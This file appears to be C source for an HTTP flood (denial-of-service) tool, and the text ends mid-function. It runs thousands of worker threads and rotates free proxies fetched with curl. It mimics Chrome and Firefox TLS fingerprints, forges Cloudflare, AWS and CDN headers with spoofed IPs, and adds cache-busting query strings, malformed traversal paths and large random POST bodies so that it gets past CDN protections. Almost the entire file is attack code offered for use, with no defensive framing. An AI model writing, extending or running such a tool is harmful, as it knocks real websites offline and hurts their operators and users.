#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <math.h>
#include <ctype.h>

// ========== TLS/SSL Headers ==========
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

// ========== HTTP/2 Headers ==========
#include <nghttp2/nghttp2.h>

// ========== Constants ==========
#define MAX_WORKERS 4000
#define MAX_PROXIES 2000
#define MAX_HEADERS 200
#define MAX_COOKIE_SIZE 8192
#define MAX_URL_LENGTH 4096
#define MAX_PATH_DEPTH 10
#define BUFFER_SIZE 65536
#define MAX_RAPID_STREAMS 100
#define USER_AGENTS_COUNT 17
#define REFERERS_COUNT 17
#define ACCEPT_LANGS_COUNT 11
#define ACCEPT_HEADERS_COUNT 5
#define ACCEPT_ENCODINGS_COUNT 5
#define CACHE_CONTROLS_COUNT 9
#define SECURITY_HEADERS_COUNT 8
#define MODERN_HEADERS_COUNT 18
#define CLOUDFLARE_IP_RANGES_COUNT 6
#define CLOUDFLARE_HEADERS_COUNT 10
#define HETZNER_HEADERS_COUNT 3
#define DIGITALOCEAN_HEADERS_COUNT 4
#define AWS_HEADERS_COUNT 7
#define APP_HEADERS_COUNT 7
#define CDN_HEADERS_COUNT 14
#define PAYLOAD_SIZES_COUNT 6
#define PATHS_COUNT 35
#define MALFORMS_COUNT 5
#define EXTENSIONS_COUNT 5
#define LANGS_COUNT 10
#define THEMES_COUNT 3
#define CURRENCIES_COUNT 6
#define TE_VALUES_COUNT 4
#define PROVIDERS_COUNT 4

// ========== ANSI Colors ==========
#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_VIOLET "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

// ========== Global Variables ==========
typedef struct {
    char *protocol;
    int supported;
} ProtocolInfo;

typedef struct {
    char *host;
    int port;
    char *path;
    char *scheme;
} ParsedURL;

typedef struct {
    char *target;
    char *host;
    char *mode;
    int use_proxy;
    volatile int *done;
    volatile long long *counter;
    pthread_mutex_t *counter_mutex;
} WorkerArgs;

typedef struct {
    char **proxies;
    int proxy_count;
    int proxy_index;
    pthread_mutex_t proxy_mutex;
    pthread_t refresher_thread;
} ProxyManager;

typedef struct {
    char *key;
    char *value;
} HeaderPair;

typedef struct {
    int val;
    pthread_mutex_t mutex;
} AtomicCounter;

// ========== Global Data ==========
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0"
};

const char *referers[] = {
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://facebook.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.tiktok.com/",
    "https://discord.com/",
    "https://web.whatsapp.com/",
    "https://mail.google.com/",
    "https://drive.google.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://www.amazon.com/",
    ""
};

const char *accept_languages[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8"
};

const char *accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
};

const char *accept_encodings[] = {
    "gzip, deflate, br",
    "gzip, deflate",
    "identity",
    "gzip;q=1.0, deflate;q=0.9, br;q=0.8",
    "*;q=0.1"
};

const char *cache_controls[] = {
    "no-cache",
    "no-store",
    "must-revalidate",
    "max-age=0",
    "private",
    "public",
    "no-transform",
    "proxy-revalidate",
    "s-maxage=0"
};

HeaderPair security_headers[] = {
    {"X-Content-Type-Options", "nosniff"},
    {"X-Frame-Options", "DENY"},
    {"X-Frame-Options", "SAMEORIGIN"},
    {"X-XSS-Protection", "1; mode=block"},
    {"Strict-Transport-Security", "max-age=31536000; includeSubDomains"},
    {"Referrer-Policy", "no-referrer"},
    {"Referrer-Policy", "strict-origin-when-cross-origin"},
    {"Referrer-Policy", "same-origin"}
};

HeaderPair modern_headers[] = {
    {"Sec-Fetch-Dest", "document"},
    {"Sec-Fetch-Dest", "empty"},
    {"Sec-Fetch-Dest", "script"},
    {"Sec-Fetch-Dest", "style"},
    {"Sec-Fetch-Dest", "image"},
    {"Sec-Fetch-Dest", "font"},
    {"Sec-Fetch-Dest", "worker"},
    {"Sec-Fetch-Mode", "navigate"},
    {"Sec-Fetch-Mode", "cors"},
    {"Sec-Fetch-Mode", "no-cors"},
    {"Sec-Fetch-Mode", "same-origin"},
    {"Sec-Fetch-Site", "same-origin"},
    {"Sec-Fetch-Site", "cross-site"},
    {"Sec-Fetch-Site", "none"},
    {"Sec-Fetch-User", "?1"},
    {"Upgrade-Insecure-Requests", "1"},
    {"DNT", "0"},
    {"DNT", "1"}
};

const char *cloudflare_ip_ranges[][2] = {
    {"173.245.48", "173.245.63"},
    {"103.21.244", "103.21.247"},
    {"141.101.64", "141.101.127"},
    {"108.162.192", "108.162.255"},
    {"104.16.0", "104.23.255"},
    {"172.64.0", "172.71.255"}
};

HeaderPair cloudflare_headers[] = {
    {"CF-Connecting-IP", ""},
    {"CF-IPCountry", "US"},
    {"CF-IPCountry", "GB"},
    {"CF-IPCountry", "DE"},
    {"CF-IPCountry", "FR"},
    {"CF-IPCountry", "CA"},
    {"CF-IPCountry", "AU"},
    {"CF-IPCountry", "JP"},
    {"CF-IPCountry", "SG"},
    {"True-Client-IP", ""}
};

HeaderPair hetzner_headers[] = {
    {"X-Client-IP", ""},
    {"X-Cluster-Client-IP", ""},
    {"X-Hetzner-DataCenter", "FSN1-DC1"}
};

HeaderPair digitalocean_headers[] = {
    {"X-Forwarded-Host", ""},
    {"X-Forwarded-Port", "80"},
    {"X-Forwarded-Port", "443"},
    {"X-Forwarded-Port", "8080"}
};

HeaderPair aws_headers[] = {
    {"X-Amz-Cf-Id", ""},
    {"X-Amz-Cf-Pop", "DFW"},
    {"X-Amz-Cf-Pop", "LHR"},
    {"X-Amz-Cf-Pop", "SIN"},
    {"X-Amz-Cf-Pop", "NRT"},
    {"X-Amz-Cf-Pop", "SYD"},
    {"Via", "1.1 amazon.cloudfront.net"}
};

HeaderPair app_headers[] = {
    {"X-Requested-With", "XMLHttpRequest"},
    {"X-Requested-With", "Fetch"},
    {"X-CSRF-Token", ""},
    {"Authorization", "Bearer "},
    {"X-API-Key", ""},
    {"X-Device-ID", ""},
    {"X-Session-ID", ""}
};

HeaderPair cdn_headers[] = {
    {"X-CDN", "Cloudflare"},
    {"X-CDN", "Akamai"},
    {"X-CDN", "Fastly"},
    {"X-CDN", "CloudFront"},
    {"X-CDN", "MaxCDN"},
    {"X-Edge-Location", "DFW"},
    {"X-Edge-Location", "LHR"},
    {"X-Edge-Location", "SIN"},
    {"X-Edge-Location", "NRT"},
    {"X-Edge-Location", "SYD"},
    {"X-Edge-Location", "GRU"},
    {"Via", "1.1 varnish"},
    {"X-Cache", "MISS"},
    {"X-Cache", "HIT"}
};

// TLS Profiles
typedef struct {
    int min_version;
    int max_version;
    const char *ciphers;
    const char *curves;
    const char *next_protos;
} TLSProfile;

TLSProfile tls_profiles[] = {
    {   // Chrome 120
        .min_version = TLS1_2_VERSION,
        .max_version = TLS1_3_VERSION,
        .ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        .curves = "X25519:P-256:P-384",
        .next_protos = "h2,http/1.1"
    },
    {   // Firefox 120
        .min_version = TLS1_2_VERSION,
        .max_version = TLS1_3_VERSION,
        .ciphers = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
        .curves = "X25519:P-256:P-384:P-521",
        .next_protos = "h2,http/1.1"
    }
};

const char *proxy_api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000";
const int refresh_interval = 300; // 5 minutes in seconds

ProxyManager proxy_manager = {0};
volatile int attack_done = 0;
volatile long long total_requests = 0;
pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t color_mutex = PTHREAD_MUTEX_INITIALIZER;
int color_index = 0;

// ========== Utility Functions ==========

void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    RAND_poll();
}

void cleanup_openssl() {
    EVP_cleanup();
}

int rand_int(int min, int max) {
    if (max <= min) return min;
    unsigned char buf[4];
    if (RAND_bytes(buf, sizeof(buf)) != 1) {
        return min + rand() % (max - min + 1);
    }
    unsigned int val = (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | buf[3];
    return min + (val % (max - min + 1));
}

long long rand_long_long(long long min, long long max) {
    if (max <= min) return min;
    unsigned char buf[8];
    if (RAND_bytes(buf, sizeof(buf)) != 1) {
        return min + (rand() % (max - min + 1));
    }
    unsigned long long val = 0;
    for (int i = 0; i < 8; i++) {
        val = (val << 8) | buf[i];
    }
    return min + (val % (max - min + 1));
}

int rand_bool() {
    return rand_int(0, 1);
}

void random_bytes(unsigned char *buf, int len) {
    if (RAND_bytes(buf, len) != 1) {
        for (int i = 0; i < len; i++) {
            buf[i] = rand() % 256;
        }
    }
}

char *random_string(int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char *str = malloc(len + 1);
    unsigned char *rand_buf = malloc(len);
    random_bytes(rand_buf, len);
    for (int i = 0; i < len; i++) {
        str[i] = charset[rand_buf[i] % (sizeof(charset) - 1)];
    }
    str[len] = '\0';
    free(rand_buf);
    return str;
}

char *random_hex(int len) {
    const char charset[] = "0123456789abcdef";
    char *str = malloc(len + 1);
    unsigned char *rand_buf = malloc(len);
    random_bytes(rand_buf, len);
    for (int i = 0; i < len; i++) {
        str[i] = charset[rand_buf[i] % (sizeof(charset) - 1)];
    }
    str[len] = '\0';
    free(rand_buf);
    return str;
}

char *random_base64(int len) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char *str = malloc(len + 1);
    unsigned char *rand_buf = malloc(len);
    random_bytes(rand_buf, len);
    for (int i = 0; i < len; i++) {
        str[i] = charset[rand_buf[i] % (sizeof(charset) - 1)];
    }
    str[len] = '\0';
    free(rand_buf);
    return str;
}

char *generate_uuid() {
    char *uuid = malloc(37);
    char *hex1 = random_hex(4);
    char *hex2 = random_hex(2);
    char *hex3 = random_hex(2);
    char *hex4 = random_hex(2);
    char *hex5 = random_hex(6);
    
    sprintf(uuid, "%s-%s-%s-%s-%s", hex1, hex2, hex3, hex4, hex5);
    
    free(hex1); free(hex2); free(hex3); free(hex4); free(hex5);
    return uuid;
}

char *generate_random_ip() {
    char *ip = malloc(20);
    sprintf(ip, "%d.%d.%d.%d", 
        rand_int(1, 255),
        rand_int(1, 255),
        rand_int(1, 255),
        rand_int(1, 255));
    return ip;
}

char *generate_cloudflare_ip() {
    int range_idx = rand_int(0, CLOUDFLARE_IP_RANGES_COUNT - 1);
    char *ip = malloc(20);
    
    if (rand_bool()) {
        sprintf(ip, "%s.%d.%d", 
            cloudflare_ip_ranges[range_idx][0],
            rand_int(0, 255),
            rand_int(1, 254));
    } else {
        sprintf(ip, "%s.%d.%d",
            cloudflare_ip_ranges[range_idx][1],
            rand_int(0, 255),
            rand_int(1, 254));
    }
    return ip;
}

const char *random_ua() {
    return user_agents[rand_int(0, USER_AGENTS_COUNT - 1)];
}

const char *random_referer() {
    return referers[rand_int(0, REFERERS_COUNT - 1)];
}

// ========== STRINGS REPEAT FUNCTION - INILIPAT KO DITO ==========
char *strings_repeat(const char *str, int count) {
    int len = strlen(str);
    char *result = malloc(len * count + 1);
    result[0] = '\0';
    for (int i = 0; i < count; i++) {
        strcat(result, str);
    }
    return result;
}
// ================================================================

// ========== URL Parsing ==========

ParsedURL *parse_url(const char *url_str) {
    ParsedURL *parsed = malloc(sizeof(ParsedURL));
    memset(parsed, 0, sizeof(ParsedURL));
    
    char *url = strdup(url_str);
    char *ptr = url;
    
    if (strncmp(ptr, "http://", 7) == 0) {
        parsed->scheme = strdup("http");
        ptr += 7;
        parsed->port = 80;
    } else if (strncmp(ptr, "https://", 8) == 0) {
        parsed->scheme = strdup("https");
        ptr += 8;
        parsed->port = 443;
    } else {
        parsed->scheme = strdup("http");
        parsed->port = 80;
    }
    
    char *slash = strchr(ptr, '/');
    if (slash) {
        parsed->host = strndup(ptr, slash - ptr);
        parsed->path = strdup(slash);
    } else {
        parsed->host = strdup(ptr);
        parsed->path = strdup("/");
    }
    
    char *colon = strchr(parsed->host, ':');
    if (colon) {
        *colon = '\0';
        parsed->port = atoi(colon + 1);
    }
    
    free(url);
    return parsed;
}

void free_parsed_url(ParsedURL *parsed) {
    if (parsed) {
        free(parsed->host);
        free(parsed->path);
        free(parsed->scheme);
        free(parsed);
    }
}

// ========== Protocol Detection ==========

ProtocolInfo *detect_protocols(const char *target) {
    ProtocolInfo *protocols = malloc(3 * sizeof(ProtocolInfo));
    for (int i = 0; i < 3; i++) {
        protocols[i].supported = 0;
        protocols[i].protocol = malloc(3);
    }
    
    strcpy(protocols[0].protocol, "h1");
    strcpy(protocols[1].protocol, "h2");
    strcpy(protocols[2].protocol, "h3");
    
    ParsedURL *parsed = parse_url(target);
    
    if (strcmp(parsed->scheme, "https") == 0) {
        protocols[1].supported = 1;
    }
    
    protocols[0].supported = 1;
    
    free_parsed_url(parsed);
    return protocols;
}

// ========== TLS Functions ==========

SSL_CTX *create_ssl_ctx_from_profile(TLSProfile *profile) {
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_options(ctx, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    
    SSL_CTX_set_min_proto_version(ctx, profile->min_version);
    SSL_CTX_set_max_proto_version(ctx, profile->max_version);
    
    SSL_CTX_set_cipher_list(ctx, profile->ciphers);
    SSL_CTX_set1_curves_list(ctx, profile->curves);
    
    const unsigned char *alpn = (const unsigned char *)"\x02h2\x08http/1.1";
    SSL_CTX_set_alpn_protos(ctx, alpn, 11);
    
    return ctx;
}

SSL_CTX *get_random_ssl_ctx() {
    int idx = rand_int(0, 1);
    return create_ssl_ctx_from_profile(&tls_profiles[idx]);
}

// ========== Atomic Counter ==========

void atomic_inc(AtomicCounter *c) {
    pthread_mutex_lock(&c->mutex);
    c->val++;
    pthread_mutex_unlock(&c->mutex);
}

int atomic_get(AtomicCounter *c) {
    pthread_mutex_lock(&c->mutex);
    int v = c->val;
    pthread_mutex_unlock(&c->mutex);
    return v;
}

// ========== Proxy Management ==========

void load_proxies_from_api() {
    char command[1024];
    sprintf(command, "curl -s '%s' -o /tmp/proxies.txt", proxy_api_url);
    
    int ret = system(command);
    if (ret != 0) {
        printf("[-] Error fetching proxies\n");
        return;
    }
    
    FILE *fp = fopen("/tmp/proxies.txt", "r");
    if (!fp) {
        printf("[-] Failed to open proxy file\n");
        return;
    }
    
    pthread_mutex_lock(&proxy_manager.proxy_mutex);
    
    for (int i = 0; i < proxy_manager.proxy_count; i++) {
        free(proxy_manager.proxies[i]);
    }
    if (proxy_manager.proxies) {
        free(proxy_manager.proxies);
    }
    
    proxy_manager.proxies = malloc(MAX_PROXIES * sizeof(char *));
    proxy_manager.proxy_count = 0;
    proxy_manager.proxy_index = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), fp) && proxy_manager.proxy_count < MAX_PROXIES) {
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 0 && strchr(line, ':')) {
            proxy_manager.proxies[proxy_manager.proxy_count] = strdup(line);
            proxy_manager.proxy_count++;
        }
    }
    
    fclose(fp);
    
    pthread_mutex_unlock(&proxy_manager.proxy_mutex);
    
    printf("[+] Loaded/Refreshed %d proxies from ProxyScrape\n", proxy_manager.proxy_count);
}

void *proxy_refresher_thread(void *arg) {
    while (!attack_done) {
        sleep(refresh_interval);
        load_proxies_from_api();
    }
    return NULL;
}

char *get_next_proxy() {
    pthread_mutex_lock(&proxy_manager.proxy_mutex);
    
    if (proxy_manager.proxy_count == 0) {
        pthread_mutex_unlock(&proxy_manager.proxy_mutex);
        return NULL;
    }
    
    char *proxy = strdup(proxy_manager.proxies[proxy_manager.proxy_index]);
    proxy_manager.proxy_index = (proxy_manager.proxy_index + 1) % proxy_manager.proxy_count;
    
    pthread_mutex_unlock(&proxy_manager.proxy_mutex);
    return proxy;
}

// ========== Header Generation Functions ==========

char *generate_cookies() {
    char cookies[MAX_COOKIE_SIZE] = {0};
    int first = 1;
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        char *val = random_base64(24);
        sprintf(cookies + strlen(cookies), "session_id=%s", val);
        free(val);
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        char *val = random_hex(32);
        sprintf(cookies + strlen(cookies), "user_token=%s", val);
        free(val);
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        char *val = random_base64(16);
        sprintf(cookies + strlen(cookies), "csrf_token=%s", val);
        free(val);
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        char *val = random_hex(16);
        sprintf(cookies + strlen(cookies), "auth_token=%s", val);
        free(val);
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "user_id=%d", rand_int(1000, 99999));
        first = 0;
    }
    
    const char *langs[] = {"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"};
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "lang=%s", langs[rand_int(0, LANGS_COUNT - 1)]);
        first = 0;
    }
    
    const char *themes[] = {"light", "dark", "auto"};
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "theme=%s", themes[rand_int(0, THEMES_COUNT - 1)]);
        first = 0;
    }
    
    const char *currencies[] = {"USD", "EUR", "GBP", "JPY", "CAD", "AUD"};
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "currency=%s", currencies[rand_int(0, CURRENCIES_COUNT - 1)]);
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "_ga=GA1.1.%lld.%ld", 
            rand_long_long(1000000000LL, 9999999999LL), time(NULL));
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        sprintf(cookies + strlen(cookies), "_gid=GA1.1.%lld.%ld", 
            rand_long_long(1000000000LL, 9999999999LL), time(NULL));
        first = 0;
    }
    
    if (rand_bool()) {
        if (!first) strcat(cookies, "; ");
        char *val = random_hex(16);
        sprintf(cookies + strlen(cookies), "__cfduid=%s%ld", val, time(NULL));
        free(val);
        first = 0;
    }
    
    if (strlen(cookies) == 0) {
        return NULL;
    }
    
    return strdup(cookies);
}

char *generate_advanced_path() {
    char *path = malloc(1024);
    path[0] = '\0';
    
    if (rand_int(1, 100) <= 30) {
        int depth = rand_int(2, 6);
        for (int i = 0; i < depth; i++) {
            char *segment = random_string(rand_int(4, 12));
            strcat(path, "/");
            strcat(path, segment);
            free(segment);
        }
        
        if (rand_bool()) {
            const char *extensions[] = {".php", ".html", ".jsp", ".asp", ".aspx"};
            strcat(path, extensions[rand_int(0, EXTENSIONS_COUNT - 1)]);
        }
        char *temp = malloc(strlen(path) + 2);
        sprintf(temp, "/%s", path);
        free(path);
        return temp;
    }
    
    if (rand_int(1, 100) <= 20) {
        char *seg1 = random_string(4);
        char *seg2 = random_string(4);
        char *seg3 = random_string(6);
        char *seg4 = random_string(8);
        
        const char *malforms[] = {
            "/%s/../%s",
            "/./%s/..",
            "//%s",
            "/%%2e%%2e%%2f%s",
            "/%s%%00%s"
        };
        
        int type = rand_int(0, MALFORMS_COUNT - 1);
        switch (type) {
            case 0: sprintf(path, malforms[type], seg1, seg2); break;
            case 1: sprintf(path, malforms[type], seg3); break;
            case 2: sprintf(path, malforms[type], seg4); break;
            case 3: sprintf(path, malforms[type], seg1); break;
            case 4: sprintf(path, malforms[type], seg1, seg2); break;
        }
        
        free(seg1); free(seg2); free(seg3); free(seg4);
        return path;
    }
    
    const char *paths[] = {
        "/", "/index.html", "/home", "/main", "/default", "/welcome",
        "/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
        "/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
        "/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
        "/images/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
        "/.env", "/config.json", "/api.json", "/manifest.json",
        "/graphql", "/rest/v1", "/oauth2/authorize", "/oauth2/token",
        "/health", "/status", "/metrics", "/debug", "/test"
    };
    
    if (rand_int(1, 100) <= 70) {
        strcpy(path, paths[rand_int(0, PATHS_COUNT - 1)]);
    } else {
        strcpy(path, "/");
    }
    
    return path;
}

char *generate_cache_bust_params() {
    char *params = malloc(2048);
    params[0] = '\0';
    
    int type = rand_int(0, 9);
    switch (type) {
        case 0:
            sprintf(params, "?v=%d", rand_int(1, 1000000));
            break;
        case 1:
            sprintf(params, "?_=%lld", (long long)time(NULL) * 1000000 + rand_int(0, 999999));
            break;
        case 2: {
            char *rnd = random_string(16);
            sprintf(params, "?rnd=%s", rnd);
            free(rnd);
            break;
        }
        case 3: {
            char *cb = random_string(8);
            sprintf(params, "?cachebuster=%s", cb);
            free(cb);
            break;
        }
        case 4: {
            char *p1 = random_string(4);
            char *v1 = random_string(6);
            char *p2 = random_string(5);
            char *v2 = random_string(8);
            sprintf(params, "?%s=%s&%s=%s", p1, v1, p2, v2);
            free(p1); free(v1); free(p2); free(v2);
            break;
        }
        case 5: {
            char *source = random_string(6);
            char *medium = random_string(5);
            char *campaign = random_string(8);
            sprintf(params, "?utm_source=%s&utm_medium=%s&utm_campaign=%s", 
                source, medium, campaign);
            free(source); free(medium); free(campaign);
            break;
        }
        case 6: {
            char *sid = random_string(32);
            sprintf(params, "?sessionid=%s", sid);
            free(sid);
            break;
        }
        case 7: {
            char *sid = random_string(26);
            sprintf(params, "?PHPSESSID=%s", sid);
            free(sid);
            break;
        }
        case 8: {
            char *sid = random_string(24);
            sprintf(params, "?jsessionid=%s", sid);
            free(sid);
            break;
        }
        case 9: {
            int numParams = rand_int(5, 15);
            strcpy(params, "?");
            for (int i = 0; i < numParams; i++) {
                char *key = random_string(rand_int(3, 8));
                char *val = random_string(rand_int(5, 20));
                sprintf(params + strlen(params), "%s=%s", key, val);
                free(key); free(val);
                if (i < numParams - 1) {
                    strcat(params, "&");
                }
            }
            break;
        }
    }
    
    return params;
}

char *generate_post_payload(int *size, char **content_type) {
    int payloadSizes[] = {1024, 2048, 4096, 8192, 16384, 32768};
    int chosen_size = payloadSizes[rand_int(0, PAYLOAD_SIZES_COUNT - 1)];
    
    int payloadType = rand_int(1, 5);
    char *payload = NULL;
    
    switch (payloadType) {
        case 1: {
            int numFields = rand_int(5, 20);
            payload = malloc(chosen_size + 1024);
            payload[0] = '\0';
            
            for (int i = 0; i < numFields; i++) {
                char *fieldName = random_string(rand_int(4, 10));
                char *fieldValue = random_string(chosen_size/numFields + rand_int(1, 100));
                sprintf(payload + strlen(payload), "%s=%s", fieldName, fieldValue);
                free(fieldName); free(fieldValue);
                if (i < numFields - 1) {
                    strcat(payload, "&");
                }
            }
            *content_type = strdup("application/x-www-form-urlencoded");
            *size = strlen(payload);
            break;
        }
        
        case 2: {
            char *data = random_string(chosen_size/4);
            char *recursive = random_string(chosen_size/4);
            payload = malloc(chosen_size + 1024);
            
            sprintf(payload, 
                "{\"data\":\"%s\",\"recursive\":{\"level1\":{\"level2\":{\"level3\":{\"level4\":\"%s\"}}}},\"array\":[",
                data, recursive);
            
            for (int i = 0; i < 50; i++) {
                char *item = random_string(20);
                sprintf(payload + strlen(payload), "\"%s\",", item);
                free(item);
            }
            strcat(payload, "\"end\"]}");
            
            free(data); free(recursive);
            *content_type = strdup("application/json");
            *size = strlen(payload);
            break;
        }
        
        case 3: {
            int items = chosen_size / 100;
            payload = malloc(chosen_size + 1024);
            strcpy(payload, "<?xml version=\"1.0\"?><data>");
            
            for (int i = 0; i < items; i++) {
                char *name = random_string(20);
                char *val = random_string(30);
                sprintf(payload + strlen(payload), 
                    "<item><name>%s</name><value>%s</value></item>", name, val);
                free(name); free(val);
            }
            strcat(payload, "</data>");
            
            *content_type = strdup("application/xml");
            *size = strlen(payload);
            break;
        }
        
        case 4: {
            char *boundary_part = random_string(16);
            char boundary[256];
            sprintf(boundary, "----WebKitFormBoundary%s", boundary_part);
            free(boundary_part);
            
            char *filename = random_string(10);
            const char *extensions[] = {".jpg", ".pdf", ".zip", ".txt", ".exe"};
            char full_filename[256];
            sprintf(full_filename, "%s%s", filename, extensions[rand_int(0, 4)]);
            free(filename);
            
            const char *content_types[] = {
                "image/jpeg", "application/pdf", "application/zip", 
                "text/plain", "application/octet-stream"
            };
            
            char *file_content = malloc(chosen_size/4);
            for (int i = 0; i < chosen_size/32; i++) {
                strcat(file_content, "FILEDATA");
            }
            
            payload = malloc(chosen_size + 1024);
            sprintf(payload,
                "--%s\r\n"
                "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                "Content-Type: %s\r\n\r\n"
                "%s\r\n"
                "--%s\r\n"
                "Content-Disposition: form-data; name=\"submit\"\r\n\r\n"
                "Upload\r\n"
                "--%s--\r\n",
                boundary, full_filename, content_types[rand_int(0, 4)],
                file_content, boundary, boundary);
            
            free(file_content);
            *content_type = malloc(512);
            snprintf(*content_type, 512, "multipart/form-data; boundary=%s", boundary);
